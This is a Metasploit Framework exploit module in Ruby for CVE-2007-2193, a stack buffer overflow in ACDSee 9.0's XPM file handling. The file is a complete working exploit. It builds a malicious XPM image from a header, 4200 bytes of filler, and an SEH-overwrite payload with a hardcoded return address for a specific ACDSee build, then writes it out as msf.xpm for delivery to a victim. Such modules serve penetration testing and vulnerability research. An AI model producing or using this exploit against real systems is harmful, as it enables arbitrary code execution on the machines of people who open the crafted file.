##
# $Id: acdsee_xpm.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'ACDSee XPM File Section Buffer Overflow\',
			\'Description\'    => %q{
					This module exploits a buffer overflow in ACDSee 9.0.
				When viewing a malicious XPM file with the ACDSee product,
				a remote attacker could overflow a buffer and execute
				arbitrary code.
			},
			\'License\'        => MSF_LICENSE,
			\'Author\'         => \'MC\',
			\'Version\'        => \'$Revision: 10477 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2007-2193\' ],
					[ \'OSVDB\', \'35236\' ],
					[ \'BID\', \'23620\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
					\'DisablePayloadHandler\' => \'true\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 750,
					\'BadChars\' => \"\\x00\",
					\'StackAdjustment\' => -3500,
					\'EncoderType\'   => Msf::Encoder::Type::AlphanumUpper,
					\'DisableNops\'   =>  \'True\',
				},
			\'Platform\' => \'win\',
			\'Targets\'        =>
				[
					[ \'ACDSee 9.0 (Build 1008)\', { \'Ret\' => 0x10020758 } ],
				],
			\'Privileged\'     => false,
			\'DisclosureDate\' => \'Nov 23 2007\',
			\'DefaultTarget\'  => 0))

		register_options(
			[
				OptString.new(\'FILENAME\', [ true, \'The file name.\',  \'msf.xpm\']),
			], self.class)
	end

	def exploit

		filler = rand_text_alpha_upper(rand(25) + 1)

		# http://www.fileformat.info/format/xpm/
		head =  \"/* XPM */\\r\\n\"
		head << \"static char * #{filler}[] = {\\r\\n\"
		head << \"\\\"\"

		buff =  rand_text_alpha_upper(4200) + generate_seh_payload(target.ret)

		foot =  \"\\\",\\r\\n\" + \"};\\r\\n\"

		xpm = head + buff + foot

		print_status(\"Creating \'#{datastore[\'FILENAME\']}\' file ...\")

		file_create(xpm)

	end

end
